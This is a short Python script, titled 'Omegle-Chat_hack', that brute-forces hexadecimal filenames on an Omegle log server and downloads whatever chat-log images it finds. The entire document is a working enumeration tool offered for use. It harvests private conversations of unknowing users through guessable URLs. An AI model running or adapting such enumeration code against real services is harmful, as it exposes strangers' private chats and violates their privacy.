###########################################################################
# Omegle-Chat_hack
# Made by - Indrajeet Bhuyan (www.hackatrick.com)
#
#
# Version: 0.1
# Date:    07-08-2016 (dd-mm-yyyy)
#
# Samuel Walters-Nevet
# Version 0.2
# Date:     19-08-2016
#
# This tool downloads random chat logs which are saved in omegle's server.
###########################################################################



import itertools
import urllib.request
from random import shuffle

print("\t\t----------Omegle Chat Hack----------\n")
f=str(0)
j=1

url="http://l.omegle.com/"
numberofImagesWanted=int(input("enter desired number of chats ('0' for no limit): " ))

stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]

if numberofImagesWanted > 0:
    # Not a perfect solution
    # URLs will always start out as "XXXXY", "XXXXZ", etc due to how itertools works
    shuffle(stuff)

for L in range(5, 10):
    for i in itertools.combinations_with_replacement(stuff, L):
        finalurl=url+str(''.join(i))+".png"

        omRequest = urllib.request.Request(finalurl)
        try:
            req = urllib.request.urlopen(omRequest)

            if j==numberofImagesWanted + 1:
                exit(0)

            j=j+1

            print('Chat downloaded \n***********************\n')
            filename = str(''.join(i))+".png"
            output = open(filename,"wb")
            output.write(req.read())
            output.close()
        except  urllib.error.URLError as e:
            print("Unsuccessful")
